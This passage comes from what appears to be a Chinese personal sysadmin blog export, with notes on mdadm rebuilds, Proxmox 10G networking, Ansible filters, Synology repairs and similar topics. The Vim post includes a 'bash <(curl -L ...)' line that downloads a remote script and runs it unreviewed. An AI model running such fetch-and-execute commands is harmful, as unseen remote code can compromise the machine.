: active raid1 sda5[0] sdb5[2] 487276352 blocks super 1.2 [2/1] [U_] [\u0026gt;....................] recovery = 0.5% (2468032/487276352) finish=2079.7min speed=3884K/sec unused devices: \u0026lt;none\u0026gt; 這個是一開始跑的速度\n然後這個是跑了大概10分鐘之後的速度(有稍稍提昇一點點)\nEvery 2.0s: cat /proc/mdstat Wed Dec 12 11:17:31 2018 Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10] md1 : active raid1 sda1[0] sdb1[2] 975296 blocks super 1.2 [2/2] [UU] md0 : active raid1 sda5[0] sdb5[2] 487276352 blocks super 1.2 [2/1] [U_] [\u0026gt;....................] recovery = 1.4% (6978688/487276352) finish=1915.9min speed=4177K/sec unused devices: \u0026lt;none\u0026gt; 等等看會不會速度再快一點..\n一個小時了，還是一樣慢..\nEvery 2.0s: cat /proc/mdstat Wed Dec 12 12:20:16 2018 Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10] md1 : active raid1 sda1[0] sdb1[2] 975296 blocks super 1.2 [2/2] [UU] md0 : active raid1 sda5[0] sdb5[2] 487276352 blocks super 1.2 [2/1] [U_] [=\u0026gt;...................] recovery = 5.2% (25526016/487276352) finish=858.6min speed=8962K/sec unused devices: \u0026lt;none\u0026gt; 突然又加速了，希望能維持下去啊！\u0026hellip;.\nEvery 2.0s: cat /proc/mdstat Wed Dec 12 13:33:42 2018 Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10] md1 : active raid1 sda1[0] sdb1[2] 975296 blocks super 1.2 [2/2] [UU] md0 : active raid1 sda5[0] sdb5[2] 487276352 blocks super 1.2 [2/1] [U_] [========\u0026gt;............] recovery = 43.6% (212611904/487276352) finish=47.6min speed=96104K/sec unused devices: \u0026lt;none\u0026gt; ","date":"2018-12-12T11:10:22+08:00","permalink":"https://h.cowbay.org/post/incredibly-slow-mdadm-rebuild/","title":"[碎念] mdadm 超級慢的rebuild 速度 Incredibly Slow mdadm Rebuild"},{"content":"因為工作的關係，現在很多時間都花在VIM的操作上\n所以之前花了滿多時間，調整出一個適合自己的VIM環境\n原本的作法是把這個設定好的環境，丟到自己建立的gitea 上面\n然後每到一台新的機器，就要去clone 下來\nBUT (對，就是這個BUT)\n手邊的機器有滿多不能直接連接internet的(酷吧，都什麼年代了，還鎖internet)\n所以常會碰到要做git clone 不能動，還要額外去指定 proxy server 這些設定，挺麻煩的\n今天剛好看到這個\nhttps://junegunn.kr/2014/10/creating-portable-vim-environment\n裡面介紹的小程式，可以把現在使用的vim 環境，打包成一個持行檔\n那只要把這個執行檔丟到要控制的機器\n那麼每一台機器都會有相同的vim 環境\n比起之前要先git clone 然後 plugininstall 的作法要更方便許多，而且操作很簡單\n只要先抓下來那個檔案並且執行\nbash \u0026lt;(curl -L https://raw.githubusercontent.com/junegunn/myvim/master/myvim) 就會在執行的目錄底下產生一個 vim.$(whoami) 的執行檔\n這個就是可以帶著走的 vim環境\n然後就把這個檔案丟到看哪一台server上，然後在其他機器上面去下載回來\n就可以有完全一樣的 vim 環境了，超級方便的！\n","date":"2018-12-07T15:19:47+08:00","permalink":"https://h.cowbay.org/post/create-portable-vim-environment/","title":"[筆記] 建立一個帶著走的 VIM 環境 Creating portable Vim environment"},{"content":"前幾天公司的一台 Synology DS 415+ 發生異常\n注意到的時候，四顆硬碟燈號都不斷的在閃爍\n但是已經無法登入系統\n重開機之後更慘，四顆硬碟燈號全部橘燈恆亮\n底下的電源藍燈不斷的在閃爍\n雖然我一再表示不希望送修了\n一來是已經過保，二來是DS415+ 本身就有intel bug，三來是因為對synology的NAS 實在沒有愛\u0026hellip;\n不過主管還是希望能夠先問群暉維修的費用多少\n登入 account.synology.com 之後，早上10:40 發了一張ticket\n請群暉提供RMA 流程\n線上運作時，發現四個硬碟燈號同時都在快速閃爍，重新開機後，STATUS 藍燈持續閃爍，四個硬碟燈號都是橘燈恆亮。 進線客服詢問，把硬碟拔出來，空機開機還是一樣的狀況。 請協助提供RMA 流程，謝謝！ 然後「當天」下午 17:40 ，客服回信了\n嗯，一封郵件要等七個小時才回信\u0026hellip;效率真是高啊！\n客服表示\nDS415提供原廠保固2年，Synology針對此型號有額外增加1年的保固期限，因此產品為3年保固產品． 根據產品的序號目前機器是過保的狀態，為確認目前產品是否仍在保固內，請問您是否還保有當初的購買證明呢？ 若產品還在保固內我會儘速替您申請機器RMA的程序． 若產品確認是過保狀態，我會替您查詢目前最新更換DS415+主機板的報價供您參考 產品已經過保了，就算用手邊的購買證明去算保固日期也是一樣\n所以請群暉客服直接提供維修主機板的報價\n然後隔天收到回信了\n稍早跟物料人同仁確認目前DS415+的PCBA是還有庫存的．主板報價是新台幣 $15,232(郵寄費 $100NTD) 由於主機板是整項產品單價最高的零件，一般我們會建議使用者若有更換的需求，轉考慮同等級新機種其實會比較划算． 以上資訊供您參考，非常感謝您對Synology產品的支持． 嗯哼，一台當初購買價格不過一萬七千多的設備，維修報價是 15232 ，還有什麼好說呢？\n這個客服也很直接說了，考慮換新機種比較划算，所以就不維修了\n只是這個型號(DS-415+)的NAS ，當初一共採購了四台\n我到這邊不到一年，維修了兩台，更換了兩次硬碟，重建了三次RAID\n群暉吶\u0026hellip; Synology 吶\u0026hellip;本來以為可以是真正的「台灣之光」的廠商吶..\n只是這將近十年下來的經驗\u0026hellip;\n我以後如果不是用「國際」大廠的NAS，不然就是會自己搞 FREENAS 之類的opensource 系統了吧\u0026hellip;\n","date":"2018-12-04T10:25:19+08:00","permalink":"https://h.cowbay.org/post/synology-ds415-repair-cost/","title":"[雜念] 群暉 Synology NAS DS 415+ 誇張的維修費用"},{"content":"想做一個 10G 的 LAB 環境出來已經很久了。\n只是礙於10G RJ45的卡太貴了，然後光纖的種類又太複雜\n如果直接在淘寶購買，很怕會買錯(什麼LC/FC LC/LC 多模單模 單芯雙芯 SFP/SFP+ 又是什麼光模塊的一大堆規格)\n所以一直沒有付諸行動。\n硬體的工作很久沒碰了，剛好在蝦皮看到有個賣家在賣 mellanox 的X2網卡，以在台灣的價格來說，算很便宜的 (550)\n聊了一下，跟他請教了關於線材、光纖模塊的問題，回答也都很快很到位\n就直接下訂了兩張網卡、兩個光纖模塊、一條LC/LC 光纖線\n就是到貨有點久，等了兩個禮拜左右，一直到昨天東西才寄到\n今天就花了點時間測試一下\n先上個圖！\n簡單說，就是有兩台機器，分別安裝 proxmox (一台是新裝的，另一台是本來就在線上的LAB用機器)以及光纖網卡\nMellanox 這張 X2 的卡， proxmox 5.1 / 5.2 可以直接抓到，所以不必另外安裝驅動程式\n硬體安裝很順利，不過軟體的設定就碰到點麻煩了，所以才想說作個筆記..\n必須作 vmbridge 才能指定這個網卡給VM用 安裝好網卡，開機，透過proxmox的WEB界面設定好網卡的資料後，原本以為可以直接使用了\n但是proxmox 會提示需要重新開機才能變更設定\n可是重新開機後，我兩台怎麼都ping不到對方\n在這之前，我已經用兩台 ubuntu 18.04 client 測試過了，只要設定好IP就可以直接通\n所以在這邊碰到這個問題，我滿訝異的\n可是看網卡的燈號，明明就有亮起來，應該是正常的呀\n原來，在proxmox 中，新增了網卡，並不是直接就可以拿來用\n要先設定好 bridge ，然後才能起新的VM、指定新設定的 vmbridge 給這個新起的機器使用\nDisk Cache type 要改 設定了新的 vmbridge 之後，就可以在新VM的設定畫面中，指定網卡走這個界面出去\n可是這樣做出來的VM ，一直無法開機\n錯誤訊息如下\nkvm: -drive file=/zp/images/100/vm-100-disk-1.qcow2,if=none,id=drive-virtio0,format=qcow2,cache=none,aio=native,detect-zeroes=on: file system may not support O_DIRECT kvm: -drive file=/zp/images/100/vm-100-disk-1.qcow2,if=none,id=drive-virtio0,format=qcow2,cache=none,aio=native,detect-zeroes=on: Could not open \u0026#39;/zp/images/100/vm-100-disk-1.qcow2\u0026#39;: Invalid argument TASK ERROR: start failed: command \u0026#39;/usr/bin/kvm -id 100 -name 123123 -chardev \u0026#39;socket,id=qmp,path=/var/run/qemu-server/100.qmp,server,nowait\u0026#39; -mon \u0026#39;chardev=qmp,mode=control\u0026#39; -pidfile /var/run/qemu-server/100.pid -daemonize -smbios \u0026#39;type=1,uuid=da27a9ea-fd55-4542-b2a7-8d5b09bf7611\u0026#39; -smp \u0026#39;2,sockets=1,cores=2,maxcpus=2\u0026#39; -nodefaults -boot \u0026#39;menu=on,strict=on,reboot-timeout=1000,splash=/usr/share/qemu-server/bootsplash.jpg\u0026#39; -vga std -vnc unix:/var/run/qemu-server/100.vnc,x509,password -cpu kvm64,+lahf_lm,+sep,+kvm_pv_unhalt,+kvm_pv_eoi,enforce -m 2048 -device \u0026#39;pci-bridge,id=pci.2,chassis_nr=2,bus=pci.0,addr=0x1f\u0026#39; -device \u0026#39;pci-bridge,id=pci.1,chassis_nr=1,bus=pci.0,addr=0x1e\u0026#39; -device \u0026#39;piix3-usb-uhci,id=uhci,bus=pci.0,addr=0x1.0x2\u0026#39; -device \u0026#39;usb-tablet,id=tablet,bus=uhci.0,port=1\u0026#39; -device \u0026#39;virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x3\u0026#39; -iscsi \u0026#39;initiator-name=iqn.1993-08.org.debian:01:b972d1ad783\u0026#39; -drive \u0026#39;file=/zp/template/iso/ubuntu-18.04.1-live-server-amd64.iso,if=none,id=drive-ide2,media=cdrom,aio=threads\u0026#39; -device \u0026#39;ide-cd,bus=ide.1,unit=0,drive=drive-ide2,id=ide2,bootindex=200\u0026#39; -drive \u0026#39;file=/zp/images/100/vm-100-disk-1.qcow2,if=none,id=drive-virtio0,format=qcow2,cache=none,aio=native,detect-zeroes=on\u0026#39; -device \u0026#39;virtio-blk-pci,drive=drive-virtio0,id=virtio0,bus=pci.0,addr=0xa,bootindex=100\u0026#39; -netdev \u0026#39;type=tap,id=net0,ifname=tap100i0,script=/var/lib/qemu-server/pve-bridge,downscript=/var/lib/qemu-server/pve-bridgedown,vhost=on\u0026#39; -device \u0026#39;virtio-net-pci,mac=A2:EA:45:EE:17:25,netdev=net0,bus=pci.0,addr=0x12,id=net0,bootindex=300\u0026#39;\u0026#39; failed: exit code 1 當然先去拜google，果然就看到了提示，需要把 磁碟的 Cache 從預設的 Default(No Cache) 改成 write through\n為什麼？我也不知道..不知道是不是因為我把磁碟種類選成用 Virtio Block 的關係\n總之呢，改完之後就可以了 \u0026hellip;\n必須手動設定路由 Update 這邊可能是我有誤解，應該不需要先在pve 本機設定 10G網卡的 IP 直接進web console 去設定 vmbr1 就好了 設定好新的VM，開機、設定IP、重開機之後，會發現還是ping 不到另一台機器..(翻桌！)\n只好又去拜google ，就看到了底下這篇\nhttps://forum.proxmox.com/threads/how-to-add-second-nic.40905/\n大概點出了方向，必須要手動增加路由(感覺有點蠢)\n像我的光纖網卡走的是 192.168.50.0/24 ，就要去把原有的192.168.50.0/24的路由給砍掉，然後再新增(是不是很蠢？)\nroot@ssd:/etc/network# ip route del 192.168.50.0/24 root@ssd:/etc/network# ip route add 192.168.50.0/24 dev vmbr1 root@ssd:/etc/network# ip route default via 192.168.11.253 dev vmbr0 onlink 192.168.11.0/24 dev vmbr0 proto kernel scope link src 192.168.11.215 192.168.50.0/24 dev vmbr1 scope link root@ssd:/etc/network# OK ping 一下對面看能不能過\nroot@ssd:/etc/network# ping 192.168.50.10 PING 192.168.50.10 (192.168.50.10) 56(84) bytes of data. 64 bytes from 192.168.50.10: icmp_seq=1 ttl=64 time=0.083 ms 64 bytes from 192.168.50.10: icmp_seq=2 ttl=64 time=0.067 ms 64 bytes from 192.168.50.10: icmp_seq=3 ttl=64 time=0.080 ms 64 bytes from 192.168.50.10: icmp_seq=4 ttl=64 time=0.126 ms ^C --- 192.168.50.10 ping statistics --- GOOD ！很好！通了一邊，另外一邊就照辦，兩邊都通了，就可以開始來測試速度了\np.s 這個路由不知道需不需要每次都手動增加，或者是有哪個config可以在開機時載入\n沒記錯的話，應該是在 /etc/network/if-up.d/ 新增一個 route 檔案\n不過這部份我不是很確定就是了\n所以自己寫了一個 script 來用..\niperf 測試速度 在linux 上，我習慣用 iperf 來測試兩台主機的連接速度\n兩邊都用 apt install iperf 裝好套件\n然後找一台作為 server ，執行\niperf -s 然後到另一台，去執行\n2018-11-30 15:36:58 [minion@ubuntu ~]$ iperf -d -t 600 -P 10 -c 192.168.50.200 WARNING: option -d is not valid for server mode ------------------------------------------------------------ Client connecting to 192.168.50.200, TCP port 5001 TCP window size: 85.0 KByte (default) ------------------------------------------------------------ [ 3] local 192.168.50.199 port 40980 connected with 192.168.50.200 port 5001 [ ID] Interval Transfer Bandwidth [ 3] 0.0-600.0 sec 641 GBytes 9.18 Gbits/sec 哈哈哈，有目有！測試速度來到了 9.18 Gbits 啊！ 就是一個爽啊！\n記得那個 server IP 是你 VM 裡面設定的 IP，不是 proxmox 上面的\n同場加映走 1Gb 網路的測試結果\n2018-11-30 16:39:37 [minion@ubuntu ~]$ iperf -d -t 600 -P 10 -c 192.168.11.171 WARNING: option -d is not valid for server mode ------------------------------------------------------------ Client connecting to 192.168.11.171, TCP port 5001 TCP window size: 85.0 KByte (default) ------------------------------------------------------------ [ 3] local 192.168.11.55 port 38582 connected with 192.168.11.171 port 5001 [ ID] Interval Transfer Bandwidth [ 3] 0.0-600.0 sec 65.8 GBytes 941 Mbits/sec 192.168.11.171 跟 192.168.50.200 是同一台機器，只是一個是10G網卡，一個是onboard的 1Gb 網卡\n速度果然是提高了十倍呀，果然就是一個爽啊！！\n實際開VM來測試看看 上面的測試，是兩台PVE HOST之間的連線測試\n接下來，要實際測試在PVE中，建立新的VM，一台安裝FreeNAS 作為storage，另一台則是一般的client\n步驟簡單來說，就是在ssd 這台PVE 建立一個新的VM，然後安裝FREENAS，並且提供NFS/iscsi 給另一台PVE Host作為storage來源\n新增storage選NFS，填入必要資訊後，在這台主機上，建立一個新的VM，磁碟選擇剛剛連接的NFS\n要特別注意，freenas的NFS Share的參數要改##### 在 mapuser/mapgroup這邊要改成 root/wheel 不然會有無法寫入的問題\n安裝完之後，實際跑一下 dd 看看速度多少\nLast login: Mon Dec 3 03:10:54 2018 2018-12-03 03:15:03 [administrator@ubuntu ~]$ dd if=/dev/zero of=testfile bs=10240 count=1000000 1000000+0 records in 1000000+0 records out 10240000000 bytes (10 GB, 9.5 GiB) copied, 9.63458 s, 1.1 GB/s 2018-12-03 03:17:28 [administrator@ubuntu ~]$ dd if=/dev/zero of=testfile bs=20480 count=1000000 1000000+0 records in 1000000+0 records out 20480000000 bytes (20 GB, 19 GiB) copied, 16.0786 s, 1.3 GB/s 2018-12-03 03:17:50 [administrator@ubuntu ~]$ dd if=/dev/zero of=testfile bs=4096 count=1000000 1000000+0 records in 1000000+0 records out 4096000000 bytes (4.1 GB, 3.8 GiB) copied, 4.80629 s, 852 MB/s 2018-12-03 03:25:23 [administrator@ubuntu ~]$ 可以看到不但大檔案速度都很快，就連小檔案(4096)居然也有852MB\n我底層也不過就是四顆 SATA3 sandisk 240G SSD 而已啊\n如果都換成PCI-E SSD ，嘿嘿\u0026hellip;(流口水\n不過呢，這個也只是自己建的LAB玩玩看而已\n真的要放到 production 環境去，我也還沒啥把握 (畢竟都是中古、二手、退役的產品拼湊起來的)\n而且沒有10G Switch ，所以只能點對點連接\n說不定等到對岸的 10G Switch 開始大降價 (我覺得 8 port SFP+ / NTD $2000 左右我應該就會出手了)\n再來把10G 的環境弄完整一點！\n","date":"2018-11-30T16:05:14+08:00","permalink":"https://h.cowbay.org/post/10g-lab-using-proxmox-and-mellanox/","title":"[筆記] 用 proxmox \u0026 Mellanox SFP 網卡土炮 10G LAB "},{"content":"在上一篇 Ansible how to use \u0026rsquo;list\u0026rsquo; in yaml file 有提到怎麼用 with_items / set_fact 來取得在yaml 檔案中的清單\n不過就是有點醜\n這兩天又修改了一下，不需要用 when 來指定條件，改成用 filter 來篩選資料\n將list整理成我們需要的「部份」資料就好，而不是所有資料都塞進來\n- name: set dc_users tags: - dcusers - depot_folder - env set_fact: dc_users: \u0026#34;{{ item.users }}\u0026#34; with_items: \u0026#34;{{ teams|selectattr(\u0026#39;name\u0026#39;,\u0026#39;equalto\u0026#39;,\u0026#39;dc\u0026#39;)|map(attribute=\u0026#39;users\u0026#39;)|list }}\u0026#34; 有沒有比較「優雅」(自己說\u0026hellip;\n先把 teams 這個 var 抓進來，然後用 selectattr 這個filter 選出 name == dc 的資料\n再將篩選後的資料，用 map 去抓出 users 這個屬性，最後轉成 list\n這樣子就可以直接得到 users 了\n","date":"2018-11-29T11:22:28+08:00","permalink":"https://h.cowbay.org/post/ansible-selectattr-filter/","title":"[筆記] 還是 Ansible Selectattr "},{"content":"這幾天在玩ansible 時，碰到一個問題\n假如我有個yaml檔作為資料來源，檔名是 abc.yml\n大概長這樣\n\u0026#34;teams\u0026#34;: [ { \u0026#34;chinese_name\u0026#34;: \u0026#34;TEAM1\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;TEAM1\u0026#34;, \u0026#34;gid\u0026#34;: 10125, \u0026#34;location\u0026#34;: [ \u0026#34;hq\u0026#34; ], \u0026#34;name\u0026#34;: \u0026#34;aa\u0026#34;, \u0026#34;users\u0026#34;: [ \u0026#34;chen\u0026#34;, \u0026#34;chou\u0026#34;, \u0026#34;huani\u0026#34;, \u0026#34;yey\u0026#34;, \u0026#34;wa\u0026#34; ] }, { \u0026#34;chinese_name\u0026#34;: \u0026#34;TEAM2\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;TEAM2\u0026#34;, \u0026#34;gid\u0026#34;: 10126, \u0026#34;location\u0026#34;: [ \u0026#34;hq\u0026#34; ], \u0026#34;name\u0026#34;: \u0026#34;bb\u0026#34;, \u0026#34;users\u0026#34;: [ \u0026#34;chhiao\u0026#34;, \u0026#34;chgc\u0026#34;, \u0026#34;chy\u0026#34;, \u0026#34;hsi\u0026#34;, \u0026#34;li\u0026#34;, \u0026#34;li\u0026#34;, \u0026#34;chgchi\u0026#34; ] } ] 稍微整理一下，比較容易看\n\u0026#34;teams\u0026#34;: [ { \u0026#34;chinese_name\u0026#34;: \u0026#34;TEAM1\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;TEAM1\u0026#34;, \u0026#34;gid\u0026#34;: 10125, \u0026#34;location\u0026#34;: [\u0026#34;hq\u0026#34;], \u0026#34;name\u0026#34;: \u0026#34;aa\u0026#34;, \u0026#34;users\u0026#34;: [\u0026#34;chen\u0026#34;,\u0026#34;chou\u0026#34;,\u0026#34;huani\u0026#34;,\u0026#34;yey\u0026#34;,\u0026#34;wa\u0026#34;] }, { \u0026#34;chinese_name\u0026#34;: \u0026#34;TEAM2\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;TEAM2\u0026#34;, \u0026#34;gid\u0026#34;: 10126, \u0026#34;location\u0026#34;: [\u0026#34;hq\u0026#34;], \u0026#34;name\u0026#34;: \u0026#34;bb\u0026#34;, \u0026#34;users\u0026#34;: [\u0026#34;chhiao\u0026#34;,\u0026#34;chgc\u0026#34;,\u0026#34;chy\u0026#34;,\u0026#34;hsi\u0026#34;,\u0026#34;li\u0026#34;,\u0026#34;chgchi\u0026#34;] } ] 在 ansible playbook 中，我用 include_vars 把這個檔案叫進來\n- name: load teams.yml tags: env include_vars: file: files/kw/teams.yml 這時候在這個執行階段，就會有一個變數叫 teams 裡面有 chinese_name/description/gid 等等這些屬性\n其中的 location/users 又是另外一個 list\n那如果我想要用users這個清單中的id作為建立帳號的來源\n我就可以用底下這段，先把 users 裡面的內容，指給 dc_users 這個 localvar\n然後加上 when 的條件，限定只有 name == aa 的 users 才會被指定給 dc_users\n- name: set aa_users tags: env set_fact: aa_users: \u0026#34;{{ item.users }}\u0026#34; when: item.name == \u0026#39;aa\u0026#39; with_items: \u0026#34;{{ teams }}\u0026#34; 這樣子執行下來是沒有問題的，不過就是醜了點 XD\n之後要抓 user 帳號時，就可以直接用 aa_users 來跑迴圈\n- name: create folder for aa_users tags: env file: path: \u0026#34;/tmp/{{ item }}\u0026#34; owner: \u0026#34;{{ item }}\u0026#34; group: \u0026#34;{{ item }}\u0026#34; state: directory with_items: \u0026#34;{{ aa_users }}\u0026#34; 很簡單的概念，因為一開始在 teams 這個 var 裡面\nusers 這個屬性是一個 list\np.s 講話一定要參雜用英文單字，這樣看起來比較屌\u0026hellip;\n所以沒辦法直接在底下的create folder task 直接叫出來\n如果直接叫 teams.users ，那會是一個清單\n[\u0026#34;chen\u0026#34;,\u0026#34;chou\u0026#34;,\u0026#34;huani\u0026#34;,\u0026#34;yey\u0026#34;,\u0026#34;wa\u0026#34;] 然後 ansible 也很厲害，就這個樣子，他還是會去忠實的執行建立目錄\n所以在 /tmp 底下就會多出一個\n[\u0026ldquo;chen\u0026rdquo;,\u0026ldquo;chou\u0026rdquo;,\u0026ldquo;huani\u0026rdquo;,\u0026ldquo;yey\u0026rdquo;,\u0026ldquo;wa\u0026rdquo;]\n這個樣子的目錄 \u0026hellip;.\n所以我的處理方式就是先把這個清單丟給一個local變數 ( aa_users )\n後面的task再用這個 {{ aa_users }} 來跑，這樣子就 OK 了\n雖說很簡單，但是卡了我一整天吶\u0026hellip;\n","date":"2018-11-27T16:50:53+08:00","permalink":"https://h.cowbay.org/post/ansible-selectattr/","title":"[筆記] Ansible how to use 'list' in yaml file "},{"content":"最近在測試metabase，記得幾個月前就有測試過\n但是當時的界面和現在的樣子差很多，看樣子改版還滿勤勞的\n所以這次改用docker來建立，根本五分鐘不到就建好了(挖鼻孔)\n不過呢，很討厭的是，一進去就發現語系採用的是簡體中文\n來看看這張圖 WHAT THE FUCK !!!\n這是哪一國的翻譯？？我相信對岸人才濟濟，絕對不至於翻譯出這種結果來..\n想當然爾，我認為這個問題可以暫時不管，反正進入系統後，再去使用者界面設定就好\nBUT .. (對，又是這個他X的BUT)\n使用者設置裡面根本沒什麼可以改！\n對，沒錯，就只有這樣！！ 請容許我再罵一次 WHAT THE FUCK !!!\n好吧，罵完就算了，還是要想辦法解決，於是切到管理界面，的確是有語言設置\n然後，我要再罵第三次 WHAT THE FUCK !!!\nThe default language for this Metabase instance.This only applies to emails, Pulses, etc. Users\u0026#39; browsers will specify the language used in the user interface. 簡單說，這邊的語言設定「不影響」使用者界面，界面使用的語系，由各個瀏覽器決定！\n好，那我去修改firefox 的語言看看\n開啟 firefox ，點選右上角的三橫槓，找到語言選項\n我一開始改成這樣\n結果不管重開幾次，開啟metabase還是那個殘體中文字\n後來想說，啊，會不會是「英語」「美語」的差異？\n所以我把順序改成\n然後再開 metabase ，結果就如我所願的，改成英文界面了\n真的是比殘體中文好太多了..\n另外，關於繁體中文的部份，也到metabase的官方論壇去留言了\n就看看官方要不要處理這個問題\u0026hellip;\n","date":"2018-11-15T11:06:28+08:00","permalink":"https://h.cowbay.org/post/change-preferred-language-in-firefox/","title":"[筆記] 為了metabase 修改 firefox 開啟網頁時使用的預設語言 change the preferred language in firefox for metabase"},{"content":"因為工作上的需求，有個資料庫需要開放給不同team的人去存取\n雖然都是在同一台機器上的同一個資料庫\n但是希望能夠不同team的人用不同的資料庫使用者\n這樣萬一出事，會比較好抓兇手？？\n總之呢，這個需求一直反覆出現\n每次開發不同的AP，就要求一個不同的代號，實在有點煩\n之前都是用pgadmin來處理，現在就改用psql來弄\n其實也很簡單\nCREATE ROLE b LOGIN; GRANT a TO b; 可以帶入script ，用script 或者用ansible去跑就好了\n省得每次都要在那邊手動改來改去..\n","date":"2018-11-12T09:48:12+08:00","permalink":"https://h.cowbay.org/post/copy_role_in_pgsql/","title":"PostgreSQL 直接從已經存在的使用者複製權限到另一個使用者"},{"content":"這是發生在一個夜黑風高的寂寥深夜\u0026hellip;.. ( What The FXXX \u0026hellip; )\n來到這個環境之後，有一個很詭異的狀況一直困擾著我\n在每個分公司，都會有一台伺服器作為KVM Host\n上面跑兩台VM，一台作為ansible controller (目前沒作用)\n另一台作為這邊所謂的 \u0026ldquo;Build Server\u0026rdquo;\n用途包含了DHCP Server / Proxy Server (squid3) / APT Proxy (squid-deb-proxy)\n問題就發生在這台 Build Server 上\u0026hellip;\n有陣子花了點時間去檢查各個分公司的網路環境，確保每一台Build Server都能夠連接Internet\n然後找了一個離總部最近的據點，把這些電腦連接Internet 的方式改為用 proxy 來控制\n在proxy內加入了 allowhost 的設定，然後把user電腦上的瀏覽器都代入 proxy server (firefox/chrome 的設定方式不同)\nacl localnet src 192.168.28.0/24 acl allowhost src \u0026#34;/etc/squid3/allowhost.txt\u0026#34; acl localdomain dstdomain \u0026#34;/etc/squid3/localdomain.txt\u0026#34; acl SSL_ports port 443 acl Safe_ports port 80 # http acl Safe_ports port 21 # ftp acl Safe_ports port 443 # https acl Safe_ports port 70 # gopher acl Safe_ports port 210 # wais acl Safe_ports port 1025-65535 # unregistered ports acl Safe_ports port 280 # http-mgmt acl Safe_ports port 488 # gss-http acl Safe_ports port 591 # filemaker acl Safe_ports port 777 # multiling http acl CONNECT method CONNECT 一開始這樣作還相安無事，但是呢，慢慢的時不時會有USER反應說無法連接 Internet\n照理來說，因為都是透過proxy上網，所以如果是proxy server出問題，那其他電腦應該也不行上Internet\n但如果這樣的話，那就一點也不詭異了呀(攤手)\n實際上的狀況是，只有反應的USER的電腦無法連接Internet\n然後真的詭異的來了\n用USER電腦去 ping proxy server ，有時候會通，有時候不通..\n從Proxy Server去 ping USER電腦，也是類似的狀況\n可是我卻可以透過IPSEC VPN，分別SSH連接到這兩台機器上\n這代表兩台的網路都OK呀..\n正當我百思不得其解的時候，突然 USER電腦那邊的 ping 有反應了\n變成可以 ping proxy Server 了！ (What the FXXX !!!!)\n我什麼都沒改呀\u0026hellip;\nupdate: 2018/11/19\n剛剛在測試一台機器，又發生這個問題\n兩台都ping不到對方\n什麼事也沒做，就是把ping中斷，然後再ping 一次，居然就可以了\n##真他X的詭異啊！\n反正呢\u0026hellip;\n這種狀況三不五時就會出現一次，會出現在哪一台電腦也不一定\n不過，依照觀察到的狀況來說，似乎都是發生在很少開機的電腦上\n然後呢，因為底層是 KVM\n我也嘗試過用virsh 去restart VM 或者是 restart network\n有時候可以解決，有時候又還是不能連接\n於是另外測試安裝了 proxmox VE 的虛擬平台\n在上面起一台新的Server，再用 ansible 做成 build server的角色\n這樣子作的機器，就不會發生這種狀況\n所以我在猜是不是跟底層是KVM有關係..\n不過要動這個的話，工程有點大，手邊也沒那麼多機器可以替換(很慘)\n暫時先保留這個作法，等到下次再發生這狀況\n再來找老闆看這情形，然後來討論要不要換掉各分公司的VM Host\u0026hellip;\n","date":"2018-11-08T18:01:23+08:00","permalink":"https://h.cowbay.org/post/weird-client-server-connection/","title":"[筆記] 詭異的client\u0026server間連線的問題，或許跟KVM有關係？"},{"content":"最近在重新規劃前人留下的backup爛攤子 各個伺服器統一備份到一台backup storage 想說如果每天能夠看到backup storage的磁碟用量的話 就可以抓出備份空間成長速度、推估需要多大的磁碟空間 找了一些工具，結果發現 durep 這個 ubuntu 內建的工具 基本上可以滿足我的需求\n我的需求其實很簡單\n可以指定目錄\u0026quot;深度\u0026quot; 可以用圖表的方式顯示目前用量 每天寄出報表 來看一下 durep 執行的狀況 如果只指定一層，那就是顯示該目錄底下的使用狀況\n2018-10-29 15:50:21 [minion@tps006 ~]$ sudo durep -td 1 -sd /file [ /file 259.0G (0 files, 3 dirs) ] 259.0G [############################# ] 100.00% Oct 25 2017 team/ 1.7M [ ] 0.00% Oct 23 14:04 html/ 741.1K [ ] 0.00% Jul 11 2016 team_commons/ 2018-10-29 15:50:26 [minion@tps006 ~]$ sudo durep -td 1 -sd /file 如果指定兩層 就顯示包含下一層目錄的磁碟使用量 好像廢話\n2018-10-29 16:14:23 [mini@s006 ~]$ sudo durep -td 2 -sd /file [ /file 259.0G (0 files, 3 dirs) ] 259.0G [############################# ] 100.00% Oct 25 2017 team/ 259.0G [##############################] 100.00% Oct 3 15:08 tp/ 0b [ ] 0.00% Jul 11 2016 temporary/ 1.7M [ ] 0.00% Oct 23 14:04 html/ 748.5K [############ ] 43.04% Jun 22 2016 font-awesome/ 282.2K [#### ] 16.23% Jun 22 2016 css/ 241.0K [#### ] 13.86% Jun 22 2016 js/ 222.9K [### ] 12.82% Jun 22 2016 img/ 210.7K [### ] 12.11% Jun 22 2016 fonts/ 18.6K [ ] 1.07% Oct 23 14:04 index.html 8.5K [ ] 0.49% Jun 22 2016 less/ 2.2K [ ] 0.12% Jun 22 2016 Gruntfile.js 1.7K [ ] 0.10% Jun 22 2016 README.md 1.2K [ ] 0.07% Jun 22 2016 mail/ 1.1K [ ] 0.06% Jun 22 2016 LICENSE 652b [ ] 0.04% Jun 22 2016 package.json 12b [ ] 0.00% Jun 22 2016 .gitignore 741.1K [ ] 0.00% Jul 11 2016 team_commons/ 709.6K [############################ ] 95.75% Oct 23 14:05 tp/ 31.5K [# ] 4.25% Oct 23 14:05 temporary/ 2018-10-29 16:14:36 [mini@s006 ~]$ 搭配mail 使用，有點可惜的是在郵件內顯示，格式稍微有點跑掉 不過至少需要看到的目錄總使用量(左上角)，還有各個子目錄的用量都可以清楚的看到 如果能夠有縮排就更好了！\n","date":"2018-11-06T15:24:29+08:00","permalink":"https://h.cowbay.org/post/nice-du-report-tool-durep/","title":"Nice Du Report Tool Durep"},{"content":"Bookstack 是一套非常好用的線上\u0026quot;筆記\u0026quot;系統\n他用圖書館/書本的概念，讓使用者可以建立自己的\u0026quot;圖書館\u0026quot;\n同時在圖書館內建立不同的\u0026quot;書籍\u0026quot;\n而且支援 Markdown 語法\n其他的方式像是在nextcloud上編輯 